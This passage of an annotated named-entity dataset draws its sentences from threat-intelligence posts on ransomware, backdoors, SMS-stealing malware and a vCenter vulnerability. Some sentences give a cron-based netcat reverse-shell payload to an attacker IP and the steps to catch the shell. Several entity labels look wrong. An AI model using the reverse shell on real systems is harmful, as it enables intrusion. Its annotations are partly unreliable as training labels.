interface, and Windbg has its own language.", {"entities": []}], ["For example, one of the PACS generated an error page when we changed one parameter.", {"entities": []}], ["For example, we detected an e-mail about the purchase of $1,999 worth of “Cryptocurrency (Bitcoin)”:", {"entities": [[58, 63, "MONEY"]]}], ["For example, wouldn’t it be nice to have commands to toggle the visibility of opcode bytes (see Figure 1)?", {"entities": []}], ["For now, head over to the flare-dbg github project page to get started.", {"entities": [[36, 42, "ORG"]]}], ["For those unfamiliar with the naming scheme, COVID-19 is a short form of Co rona v irus d isease, and 19 represents the year the outbreak was first identified.", {"entities": []}], ["FortiGuard Labs Threat Research Report Affected platforms : Microsoft Windows Impacted parties : Windows Users Impact : Unable to boot the machine Severity level : Medium", {"entities": [[0, 15, "ORG"]]}], ["FortiGuard Labs recently discovered a new malware posing as a mysterious COVID22 installer.", {"entities": [[0, 15, "ORG"]]}], ["Fortinet Protections Fortinet customers are already protected from this malware by the FortiGuard Labs AntiVirus Service as used by FortiGate , FortiClient and FortiMail , and by FortiEDR as follows: W32/Ursu.558C!tr Malicious_Behavior.", {"entities": []}], ["From the Command Prompt, type and run \\\"bootrec.exe /fixmbr\\\".", {"entities": []}], ["Furthermore, UNC1945 operated from several virtual machines pre-configured with post-exploitation tools in addition to their custom toolset to evade detection and forensics.", {"entities": [[13, 20, "Threat_Actor"]]}], ["HKCU\\\\Control Panel\\\\Desktop\\\\Wallpaper is set to: %CSIDL_DESKTOPDIRECTORY%\\\\_Locky_recover_instructions.bmp Network-Based Signatures Command and Control (CnC)", {"entities": []}], ["HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Locky <path_to_malware", {"entities": []}], ["HTTP POST request polling packet (general packet structure)", {"entities": [[0, 4, "Protocol"]]}], ["Hardcoded control server URLs.", {"entities": []}], ["Have you ever dreamed of telling IDA Pro to decompile a function or show you the strings of a binary?", {"entities": []}], ["Here the reverse shell payload used is: ***** root nc –e /bin/bash 192.168.1.2 4444 This payload when written to file reverse .json at “ / etc / cron.d /” would run the nc –e /bin/bash 192.168.1.2 4444 command every minute.", {"entities": []}], ["Here we release a library we call flare-dbg .", {"entities": []}], ["Host <redacted> HostName <redacted>", {"entities": []}], ["How to Repair a Damaged MBR Fixing an MBR is relatively easy in modern Windows.", {"entities": [[71, 78, "Operating_System"]]}], ["How to guard against such e-mails", {"entities": []}], ["However, as shown in Figure 3, we can see that Locky is catching up with Dridex’s spam activities.", {"entities": [[47, 52, "Malware_Name"], [73, 81, "Campaign"]]}], ["However, there are many other more advanced features available that provide a lot of flexibility to users including variables, loops, and conditionals.", {"entities": []}], ["IOCs Sample SHA-256: [Covid22.exe] 79f3b39797f0e85d9e537397a6f8966bc288d1b83ae1c313c825fbd17698879e [ClutterScreen.exe] 726DC8D52C9CF794412941BFBD27AF8F6FA27E72154A63F5C81A42BA40BD972D", {"entities": [[101, 118, "Filename"]]}], ["If the automatic repair mode does not kick in for some reason, you'll need to boot the system off a recovery disk or drive.", {"entities": []}], ["If the malware cannot access the hard-coded DNS servers, it does nothing and is therefore not detected.", {"entities": []}], ["If you haven’t already, be sure to check out the FLARE scripting series post on tracking function arguments using emulation , which also uses Vivisect.", {"entities": []}], ["Imagine if the files on the compromised machine had been encrypted or destroyed and could not be recovered.", {"entities": []}], ["Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks: Recursively generate a list of files in a directory and send to the control server Terminate a specific process.", {"entities": []}], ["Implant directory contained in the malicious Flash file.", {"entities": []}], ["In contrast, a debugger is attached to the actual running process, so all the library functions can be run without issue.", {"entities": []}], ["In mid-2020, we observed UNC1945", {"entities": [[3, 11, "DATE"], [25, 32, "Threat_Actor"]]}], ["In other cases, there was no need to search for vulnerabilities.", {"entities": []}], ["In the context of the medical servers, this refers to the version of XAMPP, aka Apache with MariaDB, PHP, and Perl.", {"entities": []}], ["In the disassembly view, the cursor can also be moved per “word” on the current line of the disassembly or decompilation, or even per basic block or function.", {"entities": []}], ["In the preceding banner, we retrieved two of those IDs:", {"entities": []}], ["In this analysis, we observed the return of Hidden Cobra’s Bankshot malware implant surfacing in the Turkish financial system.", {"entities": [[59, 67, "Malware_Name"]]}], ["In this case, we output an IDA Python script that creates comments in the IDB.", {"entities": []}], ["In this example, the output string is decoded to the stack.", {"entities": []}], ["In this new, aggressive campaign we see a return of the Bankshot implant, which last appeared in 2017.", {"entities": [[56, 64, "Malware_Name"], [97, 101, "DATE"]]}], ["In this way, MisoSMS stays quiet in sandbox environments, which typically use internal DNS servers and cut off access to outside networks.", {"entities": [[13, 20, "Malware_Name"]]}], ["Initial Compromise In late 2018, UNC1945 gained access to a Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise.", {"entities": [[22, 31, "DATE"], [33, 40, "Threat_Actor"]]}], ["Instructions on how to do so can be found here .", {"entities": []}], ["Intrigued, I decided to dig into the world of medical imaging and its possible security risks.", {"entities": []}], ["Introducing flare-dbg The FLARE team is introducing a Python project, flare-dbg that runs on top of pykd.", {"entities": [[26, 31, "ORG"]]}], ["Introduction This blog post is the next episode in the FireEye Labs Advanced Reverse Engineering (FLARE) team Script Series.", {"entities": [[98, 103, "ORG"]]}], ["Introduction We are expanding our script series beyond IDA Pro.", {"entities": []}], ["It also serves as a vivid reminder of how crucial protecting this threat vector is in today’s mobile environment.", {"entities": []}], ["It is also vital to remind system administrators of the importance of backing up your data on external storage in case any of your files are ever damaged, encrypted, or destroyed.", {"entities": []}], ["It is not a tool or a virtual machine distribution, nor is it a plugin or script for a popular reverse engineering tool or framework.", {"entities": []}], ["It is possible to access the images.", {"entities": []}], ["It next appeared in another Turkish government organization involved in finance and trade.", {"entities": [[28, 35, "NORP"]]}], ["It now handles all CnC communication natively in C++, making it harder for an analyst to analyze the malware by disassembling its ARM code.", {"entities": [[49, 52, "LANGUAGE"]]}], ["It was created February 26 and was submitted from the Netherlands.", {"entities": [[15, 26, "DATE"], [54, 65, "GPE"]]}], ["Its existence implies the ability to change the CnC information dynamically.", {"entities": []}], ["Its goal is to make Windbg scripting easy.", {"entities": []}], ["It’s our hope that providing voice control for the world’s most popular disassembler will further empower users with repetitive stress injuries or disabilities to more effectively put their reverse engineering skills to use with this new accessibility option as well as helping the community at large work more efficiently.", {"entities": []}], ["Just like IDA Pro, debuggers have scripting interfaces.", {"entities": []}], ["LEMONSTICK capabilities include command execution, file transfer and execution, and the ability to establish tunnel connections.", {"entities": []}], ["Larger implementations might have multiple imaging devices and acquisition gateways in various locations, connected over the Internet.", {"entities": []}], ["Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio.", {"entities": [[17, 32, "ORG"]]}], ["Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program .", {"entities": [[17, 25, "ORG"], [75, 83, "ORG"], [134, 142, "ORG"]]}], ["Let us first creat e a c ro n job file at “ / etc / cron.d /” to run as file owner and provide reverse shell.", {"entities": []}], ["Let’s look at one: \\\\x02\\\\x00\\\\x00\\\\x00\\\\x00\\\\xbe\\\\x00\\\\x01\\\\x00\\\\x00ANY-SCP         FINDSCU         \\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x151.2.840.10008.3.1.1.1!\\\\x00\\\\x00\\\\x1b\\\\x01\\\\x00\\\\x00\\\\x00@\\\\x00\\\\x00\\\\x131.2.840.10008.1.2.1P\\\\x00\\\\x00>Q\\\\x00\\\\x00\\\\x04\\\\x00\\\\x00@\\\\x00R\\\\x00\\\\x00\\\"1.2.826.0.1.3680043.2.135.1066.101U\\\\x00\\\\x00\\\\x0c1.4.16/WIN32", {"entities": []}], ["Like many other applications, dialogs are a part of IDA Pro’s user interface.", {"entities": []}], ["Like the original version of the malware, the new variant sends copies of users’ text messages to servers in China.", {"entities": [[109, 114, "GPE"]]}], ["Like the website, the MisoSMS app itself displays Korean text.", {"entities": [[22, 29, "Malware_Name"], [50, 56, "NORP"]]}], ["Locky Domain Generation Algorithm [1] http://arstechnica.com/security/2016/03/kentucky-hospital-hit-by-ransomware-attack/ Subscribe to Blogs Get email updates as new blog posts are added.", {"entities": []}], ["Locky Downloader Mechanism The preference for JavaScript downloaders could be due to the ease to transform or obfuscate the script via automation to generate new variants as depicted in Figure 8.", {"entities": []}], ["Locky_recover_instructions.bmp", {"entities": [[0, 30, "Filename"]]}], ["Log –font –unix | /usr/lib/ssh/sshd sshd kbdint - can <Encoded Password> <IP REDACTED>", {"entities": []}], ["Macros A series of voice commands can perform multi-step actions not otherwise reachable by individual keyboard shortcuts.", {"entities": []}], ["Magical Password auth.info | sshd[11800]: [ID 800047 auth.info] Accepted keyboard-interactive for root from <IP REDACTED> port 39680 ssh2 auth.notice | su:", {"entities": []}], ["Malicious document exploiting CVE-2018-4878.", {"entities": [[30, 43, "Vulnerability"]]}], ["Malware checking to make sure a received command is in the correct range.", {"entities": []}], ["Mandiant discovered and reported CVE-2020-14871, a recently patched vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM) that allows an unauthenticated attacker with network access via multiple protocols to exploit and compromise the operating system.", {"entities": [[0, 8, "ORG"]]}], ["Mandiant discovered and reported to Oracle CVE-2020-14871 , which was addressed in Oracle's October 2020 Critical Patch Update .", {"entities": [[0, 8, "ORG"], [36, 42, "ORG"], [43, 57, "Vulnerability"], [83, 89, "ORG"], [92, 104, "DATE"]]}], ["Mandiant recommends staying current on all current patch updates to ensure a high security posture.", {"entities": [[0, 8, "ORG"]]}], ["Manual programming requires the reverse engineer to reprogram the decoding function logic.", {"entities": []}], ["Medical Image Formats", {"entities": []}], ["MisoSMS, the SMS-stealing malware that we uncovered last December — yet another sign of cybercriminals’ growing interest in hijacking mobile devices for surveillance and data theft.", {"entities": [[0, 7, "Malware_Name"]]}], ["More details about this vulnerability and various affected versions can be found at NVD .", {"entities": [[84, 87, "ORG"]]}], ["Most likely the scammers will try to wangle your login credentials for some financial service or bank card details.", {"entities": []}], ["Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95", {"entities": []}], ["NRRD", {"entities": []}], ["Nearly Raw Raster Data Searching open directories and FTP servers while using several search engines, we gathered thousands of images—some of them complete MRI scans, mostly in DICOM format.", {"entities": [[54, 57, "Protocol"]]}], ["Next, we create a DebugUtils object, which contains the functions we need to control the debugger.", {"entities": []}], ["Next, we start a Python interactive shell within Windbg using pykd and import flaredbg.", {"entities": []}], ["Next, we use the DebugUtils function get_call_list to find the three push arguments for each time string_decoder is called.", {"entities": []}], ["Not only does our profile give you total control of the software, it also provides shortcuts and other cool features not previously available.", {"entities": []}], ["Note that you'll need to change your BIOS settings to ensure the system boots from the recovery media first, or else the system will try to boot using the overwritten MBR leading to a boot error.", {"entities": []}], ["Now you can simply say “make Unicode string” and the work is done for you.", {"entities": []}], ["Obfuscated JavaScript code", {"entities": []}], ["Of course, their money hasn’t gone anywhere — at least, not yet.", {"entities": []}], ["On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations.", {"entities": [[3, 14, "DATE"]]}], ["On attacker machine, use nc to listen on port where we expect to get reverse shell from vCenter server.", {"entities": []}], ["On top of that, JavaScript downloaders seem to be the preferred medium for delivering its payload as it could be easily obfuscated to create new variants.", {"entities": []}], ["On top of that, we also are seeing Dridex and Locky running campaigns on the same day, which resulted in an abnormal detection spike.", {"entities": [[35, 41, "Campaign"], [46, 51, "Malware_Name"], [73, 85, "DATE"]]}], ["Once all strings are decoded, the final step is to get these strings back into our IDB.", {"entities": []}], ["Once the call_list is generated, we iterate all calling addresses and associated arguments.", {"entities": []}], ["Once the encrypted byte array containing the CnC information is decrypted, the malware checks to see whether the CnC is a domain or an IP address.", {"entities": []}], ["Once the file is created as expected, we would receive a reverse shell from vCenter server at port 4444 as seen below: Reverse shell obtained from vCenter server Remediation and Conclusion Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability using the signature : HTTP:", {"entities": [[343, 347, "Protocol"]]}], ["Once the system boots from recovery media, you should be able to choose to run the command prompt, whereby the user can run the command \\\"bootrec.exe /fixmbr\\\".", {"entities": []}], ["Once the victim proceeds with the installation, the malware drops several malicious files before forcefully rebooting the machine.", {"entities": []}], ["Once we allocate memory for the output string, we set the newly allocated memory address as the second parameter to receive the output bytes.", {"entities": []}], ["One example: An open directory of images.", {"entities": []}], ["One of the latest victims of Locky is Methodist Hospital", {"entities": [[29, 34, "Malware_Name"], [38, 56, "ORG"]]}], ["One seller stated in an interview that “someone wanted to buy all the … records specifically,” claiming that the effort had netted US$100,000.", {"entities": [[134, 141, "MONEY"]]}], ["One tool they use is good old-fashioned spam.", {"entities": []}], ["One web server/client setup used the defaults “admin/password” as credentials without enforcing a change when the server is started for the first time.", {"entities": []}], ["Opening an image with a text editor presents the following screen:", {"entities": []}], ["Other (now obscured) strings in this example include the hospital’s name, city, patient name, and more.", {"entities": []}], ["Other Campaigns The ZIP attachment as depicted in Figure 6 contains a malicious JavaScript downloader that downloads and installs the Locky ransomware.", {"entities": [[134, 139, "Malware_Name"], [140, 150, "Malware_Type"]]}], ["Other times it is highlighted in red and repeated several times in the message.", {"entities": []}], ["Our eyebrows began to rise very early in our research, as we came across “IE 6 support only” messages or ActiveX controls and old Java support; many of these products are vulnerable to a plethora of exploits.", {"entities": []}], ["PACS Most hospitals or medical research facilities use PACS, for picture archiving and communication system, so that images such as ultrasounds, mammograms, MRIs, etc. can be accessed from the various systems within their facility, or through the cloud.", {"entities": []}], ["PACS systems connected to the Internet.", {"entities": []}], ["POST request is sent to “ /analytics/telemetry/ph/api/hyper/send” .", {"entities": []}], ["Port 900 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication", {"entities": []}], ["Provide the appropriate payload to attain reverse shell as body of request.", {"entities": []}], ["Quickly deobfuscating strings allows you to quickly figure out what the malware is doing.", {"entities": []}], ["Rather, it is a profile created for a consumer software application completely unrelated to reverse engineering or malware analysis… until now.", {"entities": []}], ["Registry Artifacts", {"entities": []}], ["RemoteForward 33002 127.0.0.1:22 Host <redacted> HostName <redacted> Port 443 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication", {"entities": []}], ["Result of tcpdump on port 15080 Looking at the logs, we can see that the file is created under folder “ / var/log/ vmware /analytics/pro d” , with the body of POST request appended to it: File created An arbitrary file upload vulnerability exists in vulnerable versions of VMware vCenter.", {"entities": [[273, 279, "ORG"]]}], ["Running this debugger script produces the following output: The output IDA Python script creates repeatable comments on all encoded string locations, as shown in Figure 3.", {"entities": []}], ["SB VBS/BadJoke.8A6B!tr VBS/BadJoke.7182!tr VBS/BadJoke.84AB!tr VBS/BadJoke.0C12!tr VBS/BadJoke.", {"entities": []}], ["SLAPSTICK logs At the initial victim, UNC1945 placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder.", {"entities": [[38, 45, "Threat_Actor"], [76, 87, "Filename"]]}], ["SSH Port Forwarding is a mechanism implemented in SSH protocol for transporting arbitrary networking data over an encrypted SSH connection (tunneling).", {"entities": [[50, 53, "Protocol"], [124, 127, "Protocol"]]}], ["SSH connections directly to the victim Solaris 10 server, since the SSH service was exposed directly to the internet at the time.", {"entities": [[0, 3, "Protocol"], [68, 71, "Protocol"]]}], ["Safari/537.36 Control Server Communications", {"entities": []}], ["See Figure 4 and Figure 5 for example campaign emails.", {"entities": []}], ["ServerAliveCountMax 3 RemoteForward 2224 <redacted>:22 Figure 3: SSH config files used by UNC1945 at different incidents As part of this multi-stage operation, UNC1945 dropped a custom QEMU Virtual Machine (VM) on multiple hosts, which was executed inside of any Linux system by launching a ‘start.sh’ script.", {"entities": [[90, 97, "Threat_Actor"], [160, 167, "Threat_Actor"], [292, 300, "Filename"]]}], ["Some of my favorite shortcuts are found under the View->Open Subviews and Windows menus.", {"entities": [[74, 81, "Operating_System"]]}], ["Some of the top affected countries are depicted in Figure 1.", {"entities": []}], ["Some of these statistics are: Configuration Data Feature Usage Data Performance Data Product Log Data Use rs can opt in or out of CEIP from vCenter’s vSphere Client:", {"entities": []}], ["Some servers connect over TCP 104; others use HTTP TCP 80 or HTTPS TCP 443.", {"entities": [[46, 50, "Protocol"], [61, 66, "Protocol"]]}], ["Sometimes the number sits unobtrusively somewhere at the bottom of the text.", {"entities": []}], ["Stay tuned for future blog posts that will describe additional uses for debugger scripts!", {"entities": []}], ["String Decoding Malware authors like to hide the intent of their software by obfuscating their strings.", {"entities": []}], ["Subscribe to Blogs Get email updates as new blog posts are added.", {"entities": []}], ["Technical Analysis of a Locky Payload Sample MD5 Sum: 3F118D0B888430AB9F58FC2589207988 (First seen on 2016-02-24 in VirusTotal) Persistence Mechanism", {"entities": [[24, 29, "Malware_Name"], [102, 112, "DATE"]]}], ["Testing creation of directory and file File 1234.json created As we can see filename “ 1234.json” is created inside folder “ _ c_i” .", {"entities": [[44, 53, "Filename"], [87, 96, "Filename"]]}], ["That check is  meaningful.", {"entities": []}], ["The API in use is confirmed when we perform network capture on port 15080.", {"entities": []}], ["The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx.", {"entities": [[4, 12, "Malware_Name"], [80, 94, "Filename"]]}], ["The CnC server currently serves a Web page that resembles an Android app, as shown in Figure 4.", {"entities": []}], ["The Create struct from selection action is a very helpful feature in this case, but it requires you to navigate to the Edit->Structs menu in order to use it.", {"entities": []}], ["The Customer Experience Improvement Program (CEIP) enables VMware to collect user usage statistics to improve their product and provide better user support.", {"entities": []}], ["The DICOM format originated in the 1980s, before cybersecurity was a key component.", {"entities": []}], ["The DICOM standard defines three data models for the query/retrieve service.", {"entities": []}], ["The FINDSCU string refers to the findscu tool, which can be used to query a PACS system.", {"entities": []}], ["The Health Insurance Portability and Accountability Act requires a secure medical imaging workflow, which includes the removal or anonymizing of metadata in DICOM files.", {"entities": []}], ["The PACS controller is the central unit coordinating all traffic among the different components.", {"entities": []}], ["The POST data is encoded using a custom algorithm.", {"entities": []}], ["The SSH service of this server was exposed to the internet at the time, the same time we observed first evidence of threat activity.", {"entities": [[4, 7, "Protocol"]]}], ["The UNC1945 configurations we observed are similarly structured with respect to the host alias, specified options, and option order (see Figure 3).", {"entities": [[4, 11, "Threat_Actor"]]}], ["The VM contained numerous tools such as network scanners, exploits and reconnaissance tools.", {"entities": []}], ["The VM was running a version of the Tiny Core Linux OS with pre-loaded scripts and tools.", {"entities": [[36, 51, "Operating_System"]]}], ["The Web page contains a link pointing to “hxxps://www.dropbox.com/s/t47d2nheqbhky64/%EA%B2%BD%20%EC%B0%B0%20%EC%B2%AD[dot]apk,” which is currently not available.", {"entities": []}], ["The ability to easily navigate and interact with items in a dialog with your voice is essential to a smooth user experience.", {"entities": []}], ["The acquisition gateway also often acts as the server connecting to the hospital’s information system (using the HL7 protocol) to enrich images with patient data.", {"entities": [[113, 116, "Protocol"]]}], ["The actor used built-in Linux commands to alter the timestamps of files and directories and used LOGBLEACH to clean logs to thwart forensic analysis, as seen in Figure 4.", {"entities": [[24, 29, "Operating_System"]]}], ["The art of hacking requires significant time and effort, encouraging experienced cybercriminals to plot their attacks based on the return they will see from their investment.", {"entities": []}], ["The author of this document is test-pc.", {"entities": []}], ["The challenge is to do this in a semi-automated way.", {"entities": []}], ["The command index calculator and jump to the appropriate command.", {"entities": []}], ["The command index table and command handler address table.", {"entities": []}], ["The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange.", {"entities": [[107, 112, "GPE"]]}], ["The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency.", {"entities": []}], ["The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.", {"entities": [[61, 74, "Vulnerability"]]}], ["The domain name of the CnC is also encrypted and stored as a byte array in the native binary.", {"entities": []}], ["The downside of selecting Startup Repair is that it will take longer to complete the job.", {"entities": []}], ["The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.", {"entities": []}], ["The file begins with the prefix DICM, an indicator that we are dealing with a DICOM file.", {"entities": []}], ["The file name Covid22 plays off the current Coronavirus disease but applies that same image of fear and destruction to computers, potentially creating a cyber-pandemic in 2022.", {"entities": [[171, 175, "DATE"]]}], ["The final component in the PACS infrastructure is the database and archiving system.", {"entities": []}], ["The first four bytes in the encrypted payload mark the length of the message.", {"entities": []}], ["The full script is available in the examples directory in the github repository.", {"entities": []}], ["The function can be described as the following C prototype: Now that we have a basic understanding of the string_decoder function, we test decoding using Windbg and flare-dbg.", {"entities": []}], ["The good news for the users is that the malware does not destroy nor steal any files on the compromised device, meaning the victim can still recover user files from the hard drive.", {"entities": []}], ["The heart of the flare-dbg project lies in the DebugUtils class, which contains several functions to handle: ·      Memory and register manipulation ·      Stack operations ·      Debugger execution ·", {"entities": []}], ["The imaging device creates a picture, such as an ultrasound or MRI, which is uploaded to an acquisition gateway.", {"entities": []}], ["The implant either fetches the user agent from Internet Explorer (using ObtainUserAgentAsString()) or uses a default user agent specified in the malware binary:", {"entities": []}], ["The implant has so far not surfaced in any other sector or country.", {"entities": []}], ["The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites.", {"entities": [[103, 110, "LANGUAGE"]]}], ["The implants are downloaded via a Flash file embedded in the malicious document.", {"entities": []}], ["The implant’s first target was a major government-controlled financial organization.", {"entities": []}], ["The intercepted SMS message is sent to the CnC with the Device ID of the already compromised device.", {"entities": []}], ["The item in question is usually a high-end device such as the latest Apple Watch or a gaming laptop purchased from Amazon or paid for through PayPal.", {"entities": [[69, 80, "PRODUCT"], [115, 121, "ORG"], [142, 148, "ORG"]]}], ["The malicious DLL is not a service DLL", {"entities": []}], ["The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear.", {"entities": [[47, 64, "DATE"], [85, 96, "DATE"]]}], ["The malicious site falcancoin.io embedded in the Flash file.", {"entities": []}], ["The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress().", {"entities": []}], ["The malware also does not demand ransom.", {"entities": []}], ["The malware also uses a domain name generation algorithm as described below.", {"entities": []}], ["The malware beacon builds a HTTP POST request to /main.php as shown in Figure 9.", {"entities": [[28, 32, "Protocol"]]}], ["The malware begins by creating a new thread from the DllMain() function to carry out its malicious activities: New thread created in the malware’s DllMain() function.", {"entities": []}], ["The malware changes the desktop background to a bitmap containing the ransom instructions.", {"entities": []}], ["The malware communicates with the following hard-coded hosts using HTTP over TCP port 80.", {"entities": [[67, 71, "Protocol"], [77, 80, "Protocol"]]}], ["The malware contains the ability to install the following registry key for persistence; this functionality is disabled in this variant.", {"entities": []}], ["The malware creates the registry key HKCU\\\\Software\\\\Locky.", {"entities": []}], ["The malware does not contain a persistence mechanism.", {"entities": []}], ["The malware drops a ransom note provided by the C2 server in all directories with encrypted files and on the desktop of the current user: _Locky_recover_instructions.txt", {"entities": []}], ["The malware drops an image on the desktop of the current user: _", {"entities": []}], ["The malware drops and executes the malicious WipeMBR.exe wiper malware that destroys the Master Boot Record (MBR) by overwriting its first 512 bytes with zeros.", {"entities": [[45, 56, "Filename"]]}], ["The malware encrypts files on the system and creates new files with the encrypted contents in the same directory with the following naming convention: <system identifier><16 random hex", {"entities": []}], ["The malware initiates communication with the control server by sending it an HTTP POST request with additional optional HTTP data, such as: ------FormBoundary<randomly_generated_characters>\\r\\nContent-Disposition: form-data; name=\\\"board_id\\\" 8306 ------FormBoundary<randomly_generated_characters>\\r\\nContent-Disposition: form-data; name=\\\"user_id\\\" *dJU!*JE&!M@UNQ@ ------FormBoundary<randomly_generated_characters>\\r\\nContent-Disposition: form-data; name=\\\"file1\\\"; filename=\\\"king.jpg\\\"\\r\\nContent-Type: application/octet-stream board_id is a four-digit number that may be an identifier for a campaign ID.", {"entities": []}], ["The malware performs the following activities: Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system", {"entities": []}], ["The malware then forces a machine reboot after displaying the following pop-up message: Because MBR has information about the partitions of the hard drive and acts as a loader for the operating system (OS), the compromised machine will not be able to load the OS upon reboot.", {"entities": []}], ["The management interface was wide open and could be accessed without credentials.", {"entities": []}], ["The medical world uses several image formats for different purposes.", {"entities": []}], ["The most common types of actions to be taken include key presses, mouse movement and clicks, and clipboard manipulation.", {"entities": []}], ["The new MisoSMS also uses a variant of the XTEA encryption algorithm to communicate with its CnC server.", {"entities": [[8, 15, "Malware_Name"]]}], ["The new MisoSMS attempts to resolve its CnC domain name(puk[dot]nespigt[dot]iego[dot]net) from one of these DNS servers.", {"entities": [[8, 15, "Malware_Name"]]}], ["The new variant also abandons SMTP email as the transport method.", {"entities": []}], ["The newer version also hard codes specific public DNS servers such as the following: resolver1.opendns.com", {"entities": []}], ["The newest version of MisoSMS suggests that cyber attackers are increasingly eyeing mobile devices — and the valuable information they store — as targets.", {"entities": [[22, 29, "Malware_Name"]]}], ["The next few paragraphs describe some other useful commands to make any reverse engineer’s job easier.", {"entities": []}], ["The next task is to identify each time the string decoder function is called and all of the arguments to each call.", {"entities": []}], ["The nonperishable nature of medical data makes an irresistible target for cybercriminals.", {"entities": []}], ["The only limits are the scammers’ imagination and vishing skills.", {"entities": []}], ["The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands: Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h", {"entities": [[13, 17, "Protocol"], [28, 36, "Filename"]]}], ["The particulars may change, but all scams have certain elements in common: the use of some sort of trick to get someone to do something.", {"entities": []}], ["The project requires pykd , winappdbg , and vivisect .", {"entities": []}], ["The pykd project was created to interface between Python and Windbg to allow debugger scripts to be written in Python.", {"entities": []}], ["The query parameters “ _c” and “ _i” defines the filename for the log collected in JSON format wherein the filename is in following format: _c< value of parameter _c", {"entities": []}], ["The request and responses of the CnC server are structured so that the first four bytes of the request and response contain the length of the encrypted blob of data.", {"entities": []}], ["The rest of the payload contains information about the infected device.", {"entities": []}], ["The results were disturbing; ultimately, we were able to combine attack vectors to reconstruct body parts from the images and make a three-dimensional model.", {"entities": []}], ["The sample (a2e966edee45b30bb6bb5c978e55833eec169098) is a Windows DLL that serves as a backdoor and contains a variety of capabilities.", {"entities": []}], ["The sample we analyzed is 99% similar to the documented Bankshot variants from 2017.", {"entities": [[56, 64, "Malware_Name"], [79, 83, "DATE"]]}], ["The scam relies on recipients being so alarmed by the not-insubstantial loss that they will act rashly, hoping to get their money back.", {"entities": []}], ["The script contained TCP forwarding settings that could be used by the threat actor in conjunction with the SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure.", {"entities": [[21, 24, "Protocol"], [108, 111, "Protocol"]]}], ["The self-decoding approach allows the malware to decode its own strings.", {"entities": []}], ["The signature is released as part of export number 3422 and is part of recommended template.", {"entities": []}], ["The software is named VoiceAttack , and its purpose is to make it easy for users to control other software on their computer using voice commands.", {"entities": [[22, 33, "Software_Name"]]}], ["The stack-trace dump revealed the use of Apache Tomcat Version 7.0.13, which has more than 40 vulnerabilities.", {"entities": [[63, 69, "Version_Tag"]]}], ["The standard format contains a detailed list of tags such as patient name, station name, hospital, etc.", {"entities": []}], ["The system ensures that all images are correctly stored and labeled for either short- or long-term storage.", {"entities": []}], ["The threat actor demonstrated experience and comfort by utilizing unique tactics, techniques and procedures (TTPs) within Unix environments, demonstrating a high level of acumen in conjunction with ease of operability in Microsoft Windows operating systems.", {"entities": [[122, 126, "Operating_System"]]}], ["The user specifies a key word or phrase, then defines one or more actions to be taken when that word or phrase is recognized.", {"entities": []}], ["The username appears to be attacker specified and has occurred in 2017 Bankshot samples.", {"entities": [[71, 79, "Malware_Name"]]}], ["The utils script contains utility functions to create IDA Python scripts.", {"entities": []}], ["The voice command “create struct from selection” does this for you automatically.", {"entities": []}], ["The “look it up” command will copy the currently highlighted token in the disassembly and search Google for it using your default browser.", {"entities": [[97, 103, "ORG"]]}], ["There are eight possible domains per day and the domains change on the first of the month and on even numbered days.", {"entities": []}], ["There are even voice commands to set the speed of the scroll to slow, medium, or fast.", {"entities": []}], ["There are several other macros in the profile that are like this and save you a lot of time navigating menus and dialogs to perform simple actions.", {"entities": []}], ["Therefore, some scammers try to optimize the process by getting potential victims to call them.", {"entities": []}], ["These URLs can be found hardcoded in the implants’ code.", {"entities": []}], ["These commands also allow for scrolling with a voice command that commences scrolling in a chosen direction, and another voice command for stopping scrolling.", {"entities": []}], ["These cursor movement and navigation commands enable users to have full control of IDA Pro without the use of their hands.", {"entities": []}], ["These documents also communicated with falcancoin.io to install Bankshot and also contain themes around cryptocurrency security.", {"entities": [[64, 72, "Malware_Name"]]}], ["These documents appear to be part of the same campaign and may have been used on different targets.", {"entities": []}], ["These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim’s system.", {"entities": [[50, 58, "Malware_Name"], [62, 80, "Tool"]]}], ["They are executed when the victim views the document.", {"entities": []}], ["They are listed below in sequence of execution.", {"entities": []}], ["They cooperated with us in investigating the vulnerabilities and taking appropriate actions to fix the issues.", {"entities": []}], ["They were successful navigating multiple segmented networks and leveraging third-party access to extend operations well beyond the initial victim.", {"entities": []}], ["The call function sets up the stack, sets any specified register values, and executes the function.", 